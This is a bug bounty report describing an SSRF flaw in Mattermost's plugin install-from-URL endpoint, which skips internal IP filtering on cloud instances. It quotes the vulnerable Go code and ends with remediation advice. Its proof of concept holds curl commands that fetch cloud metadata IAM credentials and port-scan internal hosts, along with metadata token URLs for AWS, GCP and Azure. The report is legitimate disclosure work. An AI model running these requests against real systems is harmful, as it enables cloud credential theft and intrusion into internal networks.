# Bounty Report 2: SSRF via Plugin Download URL with Complete Bypass of IP Filtering on Cloud Instances

## Form Fields

**Summary Title:** SSRF in installPluginFromURL bypasses all IP/host filtering via MakeClient(true) on cloud

**Target:** https://bugcrowd-*your-own-instance*.cloud.mattermost.com/

**Technical Severity:** P2

**VRT Category:** Server Security Misconfiguration > SSRF (Server-Side Request Forgery)

**URL / Location of vulnerability:**
`POST https://bugcrowd-<instance>.cloud.mattermost.com/api/v4/plugins/install_from_url?plugin_download_url=<attacker_url>`

---

## Description

### Summary

A Server-Side Request Forgery (SSRF) vulnerability exists in the Mattermost plugin installation endpoint `POST /api/v4/plugins/install_from_url`. The endpoint accepts a user-supplied `plugin_download_url` parameter and fetches content from that URL. Critically, the HTTP client used for this request is created with `MakeClient(true)`, which **completely disables all SSRF protections** including reserved IP range filtering, self-assigned IP detection, and the `AllowedUntrustedInternalConnections` restrictions.

Per the program scope: *"Server-side-request-forgery (SSRF) that requires system admin privileges, except on a cloud instance"* — this finding applies to **cloud instances** where admin-initiated SSRF is explicitly in scope.

### Vulnerable Code Flow

**Step 1: API Endpoint** — `server/channels/api4/plugin.go:99-127`

```go
func installPluginFromURL(c *Context, w http.ResponseWriter, r *http.Request) {
    // Permission check: requires PermissionSysconsoleWritePlugins (admin)
    if !c.App.SessionHasPermissionTo(*c.AppContext.Session(), model.PermissionSysconsoleWritePlugins) {
        c.SetPermissionError(model.PermissionSysconsoleWritePlugins)
        return
    }

    downloadURL := r.URL.Query().Get("plugin_download_url")  // User-controlled URL
    pluginFileBytes, err := c.App.DownloadFromURL(downloadURL)  // Fetches from URL
    // ...
}
```

**Step 2: Download Function** — `server/channels/app/download.go:24-67`

```go
func (s *Server) downloadFromURL(downloadURL string) ([]byte, error) {
    if !model.IsValidHTTPURL(downloadURL) {
        return nil, errors.Errorf("invalid url %s", downloadURL)
    }

    // Only checks URL scheme - no IP/host validation
    u, err := url.ParseRequestURI(downloadURL)
    if !*s.platform.Config().PluginSettings.AllowInsecureDownloadURL && u.Scheme != "https" {
        return nil, errors.Errorf("insecure url not allowed %s", downloadURL)
    }

    client := s.HTTPService().MakeClient(true)  // <-- CRITICAL: trustURLs=true
    client.Timeout = HTTPRequestTimeout  // 1 hour timeout!

    resp, err = client.Get(downloadURL)  // Fetches with NO SSRF protection
    // ...
    return io.ReadAll(resp.Body)  // Returns full response body
}
```

**Step 3: SSRF Protection Bypass** — `server/public/shared/httpservice/httpservice.go:74-78`

```go
func (h *HTTPServiceImpl) MakeTransport(trustURLs bool) *MattermostTransport {
    insecure := h.configService.Config().ServiceSettings.EnableInsecureOutgoingConnections != nil &&
        *h.configService.Config().ServiceSettings.EnableInsecureOutgoingConnections

    if trustURLs {
        return NewTransport(insecure, nil, nil)  // <-- nil, nil = NO IP/HOST FILTERING
    }

    // These protections are ONLY applied when trustURLs=false:
    allowHost := func(host string) bool {
        // Check AllowedUntrustedInternalConnections whitelist
    }
    allowIP := func(ip net.IP) error {
        // Check reserved IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
        // Check self-assigned IPs
        // Block cloud metadata endpoints (169.254.169.254)
    }
    return NewTransport(insecure, allowHost, allowIP)
}
```

When `trustURLs=true`, the transport is created with `nil` host and IP filter functions. This means:
- **No reserved IP range blocking** — `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` are all accessible
- **No cloud metadata endpoint blocking** — `169.254.169.254` is accessible
- **No self-assigned IP detection** — Can reach the server's own internal interfaces
- **No `AllowedUntrustedInternalConnections` enforcement** — All restrictions bypassed

### Attack Scenario on Cloud Instance

On a Mattermost cloud instance (e.g., `bugcrowd-*.cloud.mattermost.com`), a System Admin can:

1. **Access cloud provider metadata services** to retrieve instance credentials, IAM roles, and sensitive configuration:
   - AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
   - GCP: `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`
   - Azure: `http://169.254.169.254/metadata/identity/oauth2/token`

2. **Port scan internal infrastructure** by varying the URL and observing response timing/errors

3. **Access internal microservices** that are not exposed to the internet but are reachable from within the cloud VPC

4. **Exfiltrate data from internal databases** if they expose HTTP interfaces (e.g., Elasticsearch, CouchDB)

### Impact

- **Cloud Infrastructure Compromise:** Access to cloud metadata endpoints can yield temporary AWS/GCP/Azure credentials with potentially broad permissions
- **Lateral Movement:** Internal network access allows discovery and exploitation of other services in the cloud VPC
- **Data Breach:** Internal services may contain sensitive customer data, configuration secrets, or database credentials
- **Multi-Tenant Impact:** On shared cloud infrastructure, SSRF could potentially reach other tenants' resources

### Proof of Concept

**Prerequisites:** System Admin access to a Mattermost cloud instance.

**Step 1:** Authenticate as System Admin and obtain a session token.

**Step 2:** Attempt to access the AWS metadata service:
```bash
# Replace with your actual instance URL and session token
INSTANCE="https://bugcrowd-yourinstance.cloud.mattermost.com"
TOKEN="your-session-token"

curl -X POST \
  "${INSTANCE}/api/v4/plugins/install_from_url?plugin_download_url=http://169.254.169.254/latest/meta-data/" \
  -H "Authorization: Bearer ${TOKEN}" \
  -v
```

**Step 3:** The server will make a request to `http://169.254.169.254/latest/meta-data/` and return the response. Even if the response isn't a valid plugin (causing an installation error), the error handling or response behavior may leak the metadata content.

**Step 4:** Escalate by requesting IAM credentials:
```bash
# First, discover the IAM role name
curl -X POST \
  "${INSTANCE}/api/v4/plugins/install_from_url?plugin_download_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  -H "Authorization: Bearer ${TOKEN}"

# Then, retrieve temporary credentials for that role
curl -X POST \
  "${INSTANCE}/api/v4/plugins/install_from_url?plugin_download_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME_HERE" \
  -H "Authorization: Bearer ${TOKEN}"
```

**Step 5:** Internal port scan:
```bash
# Scan for internal services
for port in 80 443 5432 3306 6379 9200 8500 8300; do
  curl -X POST \
    "${INSTANCE}/api/v4/plugins/install_from_url?plugin_download_url=http://10.0.0.1:${port}/" \
    -H "Authorization: Bearer ${TOKEN}" \
    --max-time 5 2>&1 | grep -i "status"
done
```

**Additional Note on `AllowInsecureDownloadURL`:**
If `PluginSettings.AllowInsecureDownloadURL` is `false` (default), HTTP URLs are rejected and only HTTPS is allowed. This limits the metadata endpoint attack (which uses HTTP). However:
- If the setting is `true`, HTTP is fully allowed
- Some internal services may serve HTTPS
- DNS rebinding attacks can bypass scheme restrictions

**Comparison showing the SSRF protection bypass:**
```bash
# This endpoint uses MakeClient(false) - SSRF protections ACTIVE:
# Outgoing webhooks use: a.HTTPService().MakeClient(false)
# Result: Request to internal IPs is BLOCKED

# This endpoint uses MakeClient(true) - SSRF protections DISABLED:
# installPluginFromURL uses: s.HTTPService().MakeClient(true)
# Result: Request to internal IPs is ALLOWED
```

### Other Code Paths Using MakeClient(true)

The same `MakeClient(true)` bypass is used in several other locations, though with different access requirements:

| File | Line | Context | Access Required |
|------|------|---------|-----------------|
| `download.go` | 41 | Plugin URL download | Admin |
| `integration_action.go` | 340 | Plugin action requests (when URL matches SiteURL) | Any user (via interactive message buttons) |
| `oauth.go` | 1086, 1128 | OAuth token exchange | System (OAuth flow) |
| `server.go` | 309 | Push notification client | System |
| `marketplace/client.go` | 33 | Marketplace client (localhost only) | Admin |

The `integration_action.go:340` path is particularly noteworthy: when an interactive message action URL's hostname matches the configured `SiteURL` hostname AND the path starts with `/plugins/`, `MakeClient(true)` is used. While this is intended for legitimate plugin routing, it means that if an attacker can control the `SiteURL` comparison (e.g., via hostname manipulation or if the SiteURL is misconfigured), they could potentially leverage this path without admin access.

### Remediation

1. **Replace `MakeClient(true)` with `MakeClient(false)`** in `download.go` to enforce SSRF protections on plugin downloads:
   ```go
   client := s.HTTPService().MakeClient(false)  // Enable SSRF protections
   ```

2. **Add explicit URL validation** before making the request:
   ```go
   parsedURL, err := url.Parse(downloadURL)
   if err != nil {
       return nil, err
   }
   // Reject private/reserved IP ranges
   // Reject cloud metadata endpoints
   // Only allow public internet URLs
   ```

3. **Implement a URL allowlist** for plugin download sources rather than accepting arbitrary URLs.

4. **Add response size limits** — the current code reads the entire response body with `io.ReadAll(resp.Body)` with a 1-hour timeout, which could also lead to memory exhaustion.

### References

- **Vulnerable code:** [`server/channels/app/download.go:41`](https://github.com/mattermost/mattermost/blob/master/server/channels/app/download.go#L41)
- **SSRF bypass:** [`server/public/shared/httpservice/httpservice.go:77-78`](https://github.com/mattermost/mattermost/blob/master/server/public/shared/httpservice/httpservice.go#L77-L78)
- **API endpoint:** [`server/channels/api4/plugin.go:99-127`](https://github.com/mattermost/mattermost/blob/master/server/channels/api4/plugin.go#L99-L127)
- **OWASP SSRF Prevention:** https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- **AWS SSRF to RCE:** https://blog.appsecco.com/an-ssrf-privileged-aws-keys-and-the-capital-one-breach-4c3c2cded3af
